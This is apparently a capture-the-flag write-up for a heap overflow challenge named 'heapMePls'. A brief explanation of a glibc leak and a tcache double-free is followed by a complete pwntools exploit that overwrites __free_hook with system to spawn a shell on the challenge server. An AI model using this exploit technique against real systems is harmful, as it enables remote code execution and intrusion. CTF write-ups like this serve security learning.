### 0x00 Challenge: heapMePls
**Description:**
>Bin: https://drive.google.com/file/d/1iwb124SFxfSvHLdaQTV6tQ69Bq006ToR/view?usp=sharing
>
>nc 168.119.247.237 5012

### 0x01 Write-up:
The exploitation of this heap overflow challenge consits in the following step:
0x0 Leak glibc address
0x1 Exploit the double-free vulnerability, because GLIBC<2.29 has not mitigation for tcache double-free.

First, for simplicity make a script with simulate the interactions with the vulnerable program, e.g. with the functionalities to add, read, modify and free chunks.

Second, make the exploit, in order to leak glibc address, we have to fulfill the unsorted bins list with 7 chunks, after free these chunks we will have the main_arena address in the chunks. With read functions we can read this address. Thus, we will have glibc base address by a calculation of main_arena address.

Finally, now that we have all the function addresses of glibc, we just need to exploit the double-free, and overwrite one address that is called by the program, e.g. __free_hook. In this example, we overwrite __free_hook with system and with the argument "/bin/sh", thus, when we call free the next time we will execute system("/bin/sh").

**Exploit:**
```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./vuln")
libc = elf.libc

context.terminal = ["tmux", "splitw", "-h"]

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('168.119.247.237',5012)
    else:
        print(args)
        return process(elf.path)

def add(size, data):
    io.sendline("1")
    io.sendlineafter("N# of items: ", f"{size}")
    io.sendlineafter("Name: ", data)
    n = io.recvuntil("created")
    io.recvuntil("> ")
    return int(str(n).split(" ")[1])


def free(num):
    io.sendline("2")
    io.sendlineafter("Intro index: ", f"{num}")
    io.recvuntil("> ")


def readchunk(num):
    io.sendline("3")
    io.sendlineafter("Intro index: ", f"{num}")
    r = io.recv(0x58)
    io.recvuntil("> ")
    return r

def edit(num, size, data):
    io.send("4\n")
    io.sendlineafter("Intro index: ", f"{num}")
    io.sendlineafter("Intro size: ", f"{size}")
    io.sendlineafter("Intro data: ", data)
    io.recvuntil("> ")

io = start()
io.recvuntil("> ")
io.timeout = 0.1


#### Leak heap
index = 0
chunk_1 = add(256, b"AAAAA")
chunk_2 = add(256, b"BBBBB")
chunk_3 = add(256, b"CCCCC")
free(chunk_2)
free(chunk_3)
data = readchunk(chunk_3)
data_sanitized = data[0:8].decode('iso-8859-1').split("\x0a")[0]
heap_address = unpack(data_sanitized.encode('iso-8859-1'), 'all') - 0x370
log.info(f"heap address: 0x{heap_address:02x}")

# leak libc
chunk_4 = add(256, b"AA")
chunk_5 = add(256, b"XXXXXXXX")
chunk_6 = add(256, b"LOLOL")
chunk_7 = add(256, b"LOLOL")
chunk_8 = add(256, b"LOLOL")
chunk_9 = add(256, b"LOLOL")
chunk_10 = add(256, b"LOLOL")
chunk_11 = add(256, b"LOLOL")
chunk_12 = add(256, b"LOLOL")
free(chunk_4)
free(chunk_5)
free(chunk_6)
free(chunk_7)
free(chunk_8)
free(chunk_9)
free(chunk_10)
free(chunk_11)   # Unsortedbin can leak libc address
data = readchunk(chunk_11)
data_sanitized = data[0:8].decode('iso-8859-1').split("\x0a")[0]
main_arena_address = unpack(data_sanitized.encode('iso-8859-1'), 'all') - 96
log.info(f"main arena address: 0x{main_arena_address:02x}")
libc.address = main_arena_address - libc.sym.main_arena
log.info(f"libc address: 0x{libc.address:02x}")

#Restore
chunk_4 = add(256, b"AA")
chunk_5 = add(256, b"XXXXXXXX")
chunk_6 = add(256, b"LOLOL")
chunk_7 = add(256, b"LOLOL")
chunk_8 = add(256, b"LOLOL")
chunk_9 = add(256, b"LOLOL")
chunk_10 = add(256, b"LOLOL")
chunk_11 = add(256, b"LOLOL")
chunk_12 = add(256, b"LOLOL")


# < GLIBC 2.29 there is no tcache double-free mitigation
chunk_x = add(30, b"BBBB")
free(chunk_x)
free(chunk_x)
log.info(f"__free_hook address: 0x{libc.sym.__free_hook:02x}")
log.info(f"Writing in address 0x{libc.sym.__free_hook-8:02x}")
chunk_13 = add(30, p64(libc.sym.__free_hook)) # address to overwrite, needs leak libc
chunk_14 = add(30, b"dummy")
chunk_15 = add(30, p64(libc.sym.system))
chunk_16 = add(30, b"/bin/sh\0")
free(chunk_16)

io.interactive()
```

